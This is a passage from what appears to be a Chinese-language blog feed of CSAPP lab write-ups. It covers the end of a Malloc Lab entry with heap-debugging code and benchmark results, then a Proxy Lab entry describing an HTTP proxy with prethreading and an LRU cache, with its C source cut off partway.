class="hljs-number">0</span>; i &lt; LIST_SIZE; i++)<br>    &#123;<br>        block_st = segregated_free_lists[i];<br>        <span class="hljs-keyword">if</span> (block_st == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;list is NULL\n&quot;);</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--------list idx:%d---------[%d,%d)\n&quot;</span>, i, <span class="hljs-number">1</span> &lt;&lt; i, <span class="hljs-number">1</span> &lt;&lt; (i + <span class="hljs-number">1</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)block_st);<br>            <span class="hljs-keyword">while</span> (block_st != <span class="hljs-literal">NULL</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x: size:%d----&gt;&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)block_st, GET_SIZE(HDRP(block_st)));<br>                block_st = SUCC_BLOCK(block_st);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-----------------------------------end list info for debug--------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">printf_command_number</span><span class="hljs-params">(<span class="hljs-type">int</span> debug, <span class="hljs-type">int</span> flag)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> order_count = <span class="hljs-number">5</span>; <span class="hljs-comment">// 打印rep的命令序号  用于</span><br>    <span class="hljs-keyword">if</span> (!debug)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--command order:%d----\n&quot;</span>, order_count);<br>    <span class="hljs-keyword">if</span> (flag == MM_MALLOC || flag == MM_FREE)<br>        order_count++;<br>&#125;<br><br><span class="hljs-comment">/*-----------------------------------end check heap-------------------------------------*/</span><br><br></code></pre></td></tr></table></figure><h5 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Results</span> for mm malloc:<br><span class="hljs-attribute">trace</span>  valid  util     ops      secs  Kops<br> <span class="hljs-attribute">0</span>       yes   <span class="hljs-number">99</span>%    <span class="hljs-number">5694</span>  <span class="hljs-number">0</span>.<span class="hljs-number">000189</span> <span class="hljs-number">30207</span><br> <span class="hljs-attribute">1</span>       yes   <span class="hljs-number">99</span>%    <span class="hljs-number">5848</span>  <span class="hljs-number">0</span>.<span class="hljs-number">000173</span> <span class="hljs-number">33764</span><br> <span class="hljs-attribute">2</span>       yes   <span class="hljs-number">99</span>%    <span class="hljs-number">6648</span>  <span class="hljs-number">0</span>.<span class="hljs-number">000204</span> <span class="hljs-number">32636</span><br> <span class="hljs-attribute">3</span>       yes  <span class="hljs-number">100</span>%    <span class="hljs-number">5380</span>  <span class="hljs-number">0</span>.<span class="hljs-number">000159</span> <span class="hljs-number">33752</span><br> <span class="hljs-attribute">4</span>       yes   <span class="hljs-number">66</span>%   <span class="hljs-number">14400</span>  <span class="hljs-number">0</span>.<span class="hljs-number">000242</span> <span class="hljs-number">59627</span><br> <span class="hljs-attribute">5</span>       yes   <span class="hljs-number">96</span>%    <span class="hljs-number">4800</span>  <span class="hljs-number">0</span>.<span class="hljs-number">000445</span> <span class="hljs-number">10791</span><br> <span class="hljs-attribute">6</span>       yes   <span class="hljs-number">95</span>%    <span class="hljs-number">4800</span>  <span class="hljs-number">0</span>.<span class="hljs-number">000458</span> <span class="hljs-number">10478</span><br> <span class="hljs-attribute">7</span>       yes   <span class="hljs-number">55</span>%   <span class="hljs-number">12000</span>  <span class="hljs-number">0</span>.<span class="hljs-number">000249</span> <span class="hljs-number">48290</span><br> <span class="hljs-attribute">8</span>       yes   <span class="hljs-number">51</span>%   <span class="hljs-number">24000</span>  <span class="hljs-number">0</span>.<span class="hljs-number">000588</span> <span class="hljs-number">40823</span><br> <span class="hljs-attribute">9</span>       yes   <span class="hljs-number">31</span>%   <span class="hljs-number">14401</span>  <span class="hljs-number">0</span>.<span class="hljs-number">037130</span>   <span class="hljs-number">388</span><br><span class="hljs-attribute">10</span>       yes   <span class="hljs-number">30</span>%   <span class="hljs-number">14401</span>  <span class="hljs-number">0</span>.<span class="hljs-number">001842</span>  <span class="hljs-number">7819</span><br><span class="hljs-attribute">Total</span>          <span class="hljs-number">75</span>%  <span class="hljs-number">112372</span>  <span class="hljs-number">0</span>.<span class="hljs-number">041677</span>  <span class="hljs-number">2696</span><br><br><span class="hljs-attribute">Perf</span> index = <span class="hljs-number">45</span> (util) + <span class="hljs-number">40</span> (thru) = <span class="hljs-number">85</span>/<span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><h4 id="重写realloc"><a href="#重写realloc" class="headerlink" title="重写realloc"></a>重写realloc</h4><p>该方案可以达到90+的分数 时间原因暂未实现 </p><h3 id="事项"><a href="#事项" class="headerlink" title="事项"></a>事项</h3><p>定义了许多宏，用于指针的强制类型转换，涉及虚拟内存地址的读写操作。</p><p>该实验会遇到大量的segmentation fault和payload overlap。</p><p>前者一般是访问到了未分配的虚拟空间，后者是分配块重叠了。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/496366818">CSAPP | Lab8-Malloc Lab 深入解析 - 知乎 (zhihu.com)</a></p><p><a href="https://github.com/tinyargonaut/Malloc-Lab">tinyargonaut&#x2F;Malloc-Lab: Malloc Lab from CMU. Contains only mm.c (98&#x2F;100 performance) with detailed comments (github.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/project/2025/05/24/csapp/8,proxy_lab/"/>
    <url>/project/2025/05/24/csapp/8,proxy_lab/</url>
    
    <content type="html"><![CDATA[<h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><p>实现一个web代理，实验分为三部分；</p><p>第一部分，接收和解析客户端的请求，传递给服务端，并把服务端的回复传递给客户端；</p><p>第二部分，处理并发的请求；</p><p>第三部分，利用cache缓存最近请求的web内容。</p><p>可以利用curl模拟HTTP事务，进行调试。例如<code>curl -v --proxy http://localhost:15214 http://localhost:15213/home.html</code></p><h3 id="网络编程基础"><a href="#网络编程基础" class="headerlink" title="网络编程基础"></a>网络编程基础</h3><img src="./image/8,proxy_lab_image/image-20240923101823729.png" alt="image-20240923101823729" style="zoom:80%;" /><p>需要记住客户端和服务端连接的过程。</p><img src="./image/8,proxy_lab_image/image-20240923102240934.png" alt="image-20240923102240934" style="zoom:67%;" /><img src="./image/8,proxy_lab_image/image-20240923101848102.png" alt="image-20240923101848102" style="zoom: 67%;" /><p>套接字地址结构如上。</p><p>利用<code>getaddrinfo</code>可以更便捷地构建套接字地址结构。其返回一个指向<code>addrinfo</code>的链表</p><img src="./image/8,proxy_lab_image/image-20240923103437296.png" alt="image-20240923103437296" style="zoom:80%;" /><p>本书编写了<code>open_clientfd</code>和<code>open_listenfd</code>简化了客户端和服务端的连接过程。</p><h3 id="TINY-WEB服务器"><a href="#TINY-WEB服务器" class="headerlink" title="TINY WEB服务器"></a>TINY WEB服务器</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">doit</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;   <span class="hljs-comment">//处理HTTP事务</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_requesthdrs</span><span class="hljs-params">(<span class="hljs-type">rio_t</span> *rp)</span>;   <span class="hljs-comment">//处理请求报头 只在HTTP/1.1需要</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">parse_uri</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri, <span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *cgiargs)</span>;   <span class="hljs-comment">//解析uri</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">serve_static</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *filename, <span class="hljs-type">int</span> filesize)</span>;        <br><span class="hljs-type">void</span> <span class="hljs-title function_">get_filetype</span><span class="hljs-params">(<span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *filetype)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">serve_dynamic</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *cgiargs)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">clienterror</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *cause, <span class="hljs-type">char</span> *errnum, </span><br><span class="hljs-params"> <span class="hljs-type">char</span> *shortmsg, <span class="hljs-type">char</span> *longmsg)</span>;  <span class="hljs-comment">//解释错误信息</span><br></code></pre></td></tr></table></figure><h3 id="PART-1-实现简单的proxy"><a href="#PART-1-实现简单的proxy" class="headerlink" title="PART 1 实现简单的proxy"></a>PART 1 实现简单的proxy</h3><ol><li><p>浏览器向proxy发送<code>GET http://www.cmu.edu/hub/index.html HTTP/1.1  </code>，然后proxy向<code>www.cmu.edu</code>发送<code>GET /hub/index.html HTTP/1.0  </code>。注意浏览器发送<code>HTTP/1.1</code>，proxy发送<code>HTTP/1.0</code>。</p></li><li><p>&#x3D;&#x3D;请求行&#x3D;&#x3D;以<code>\r\n</code>结束每行.</p></li><li><p>请求行之后跟随的是一行或多行&#x3D;&#x3D;请求报头&#x3D;&#x3D;。最后以<code>\r\n</code>终止请求。需要添加以下报头信息。</p></li></ol><ul><li><p><code>Host</code>: 如 <code>Host: www.cmu.edu</code></p></li><li><p><code>User-Agent</code>: 如 <code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</code></p><p>在<code>proxy.c</code>中提供了<code>user_agent_hdr</code>信息</p></li><li><p><code>Connection</code>: 必须发送 <code>Connection: close</code></p></li><li><p><code>Proxy-Connection</code>: 必须发送 <code>Proxy-Connection: close</code></p></li></ul><p>这一部分需要识别并处理<code> HTTP/1.0 GET</code>请求，主要是需要解析命令，获取url，并转发给tiny web server。</p><p>需要利用&#x3D;&#x3D;字符串函数&#x3D;&#x3D;定位hostname和uri指向的目录，需要判断url中是否包含port。</p><h3 id="PART-2-基于预线程化的proxy"><a href="#PART-2-基于预线程化的proxy" class="headerlink" title="PART 2 基于预线程化的proxy"></a>PART 2 基于预线程化的proxy</h3><p>注意线程要detach，以避免内存泄漏。</p><img src="./image/8,proxy_lab_image/image-20240923194552269.png" alt="image-20240923194552269" style="zoom:80%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 基于预线程化，处理并发</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *vargp)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">sbuf_init</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp, <span class="hljs-type">int</span> n)</span>;      <span class="hljs-comment">/* Initialize shared buffer */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sbuf_deinit</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp)</span>;           <span class="hljs-comment">/* Clean up shared buffer */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sbuf_insert</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp, <span class="hljs-type">int</span> item)</span>; <span class="hljs-comment">/* Insert item onto rear of buffer */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sbuf_remove</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp)</span>;            <span class="hljs-comment">/* Remove and return first item from buffer */</span><br></code></pre></td></tr></table></figure><p>参考教材p705的生产者-消费者模型和p709的预线程化案例。</p><p>当缓存池中没有已连接的描述符时，由于信号的P操作，线程会挂起，直到有新的连接。</p><h3 id="PART-3-cache缓存"><a href="#PART-3-cache缓存" class="headerlink" title="PART 3 cache缓存"></a>PART 3 cache缓存</h3><p>cache缓存最近请求的web对象。</p><p>利用读者-写者模型。</p><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;csapp.h&quot;</span></span><br><span class="hljs-comment">/* Recommended max cache and object sizes */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE_SIZE 1049000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_OBJECT_SIZE 102400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SBUFSIZE 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NTHREADS 4</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Uri</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> host[MAXLINE]; <span class="hljs-comment">// hostname</span><br>    <span class="hljs-type">char</span> port[MAXLINE]; <span class="hljs-comment">// 端口</span><br>    <span class="hljs-type">char</span> path[MAXLINE]; <span class="hljs-comment">// 路径</span><br>&#125;;<br><br><span class="hljs-comment">// 参考p705 利用sbuf实现生产者-消费者模型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> *buf;    <span class="hljs-comment">/* Buffer array */</span><br>    <span class="hljs-type">int</span> n;       <span class="hljs-comment">/* Maximum number of slots */</span><br>    <span class="hljs-type">int</span> front;   <span class="hljs-comment">/* buf[(front+1)%n] is first item */</span><br>    <span class="hljs-type">int</span> rear;    <span class="hljs-comment">/* buf[rear%n] is last item */</span><br>    <span class="hljs-type">sem_t</span> mutex; <span class="hljs-comment">/* Protects accesses to buf */</span><br>    <span class="hljs-type">sem_t</span> slots; <span class="hljs-comment">/* Counts available slots */</span><br>    <span class="hljs-type">sem_t</span> items; <span class="hljs-comment">/* Counts available items */</span><br>&#125; <span class="hljs-type">sbuf_t</span>;<br><span class="hljs-type">sbuf_t</span> sbuf; <span class="hljs-comment">// 缓冲区</span><br><br><span class="hljs-comment">// Cache结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> obj[MAX_OBJECT_SIZE];<br>    <span class="hljs-type">char</span> uri[MAXLINE];<br>    <span class="hljs-type">int</span> LRU; <span class="hljs-comment">// 定义LRU越大，block越新</span><br>    <span class="hljs-type">int</span> isEmpty;<br><br>    <span class="hljs-type">int</span> read_cnt; <span class="hljs-comment">// 读者数量    采用读者优先 参考教材p703</span><br>    <span class="hljs-type">sem_t</span> w;      <span class="hljs-comment">// 保护Cache</span><br>    <span class="hljs-type">sem_t</span> mutex;  <span class="hljs-comment">// 保护 read_cnt</span><br><br>&#125; block;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    block data[MAX_CACHE];<br>    <span class="hljs-type">int</span> num;<br>&#125; Cache;<br>Cache cache;<br><br><span class="hljs-comment">// 简单的proxy实现，主要是实现了uri解析、header构建、连接服务器、转发响应的功能。</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">doit</span><span class="hljs-params">(<span class="hljs-type">int</span> connfd)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">parse_uri</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri, <span class="hljs-keyword">struct</span> Uri *uri_data)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">build_header</span><span class="hljs-params">(<span class="hljs-type">char</span> *http_header, <span class="hljs-keyword">struct</span> Uri *uri_data, <span class="hljs-type">rio_t</span> *client_rio)</span>;<br><span class="hljs-comment">// 基于预线程化，处理并发</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *vargp)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">sbuf_init</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp, <span class="hljs-type">int</span> n)</span>;      <span class="hljs-comment">/* Initialize shared buffer */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sbuf_deinit</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp)</span>;           <span class="hljs-comment">/* Clean up shared buffer */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sbuf_insert</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp, <span class="hljs-type">int</span> item)</span>; <span class="hljs-comment">/* Insert item onto rear of buffer */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sbuf_remove</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp)</span>;            <span class="hljs-comment">/* Remove and return first item from buffer */</span><br><span class="hljs-comment">// cache相关函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_Cache</span><span class="hljs-params">()</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">get_Cache</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">get_Index</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update_LRU</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">write_Cache</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri, <span class="hljs-type">char</span> *buf)</span>;<br><br><span class="hljs-comment">/* 处理SIGPIPE信号 */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigpipe_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha?&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">pthread_t</span> tid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> 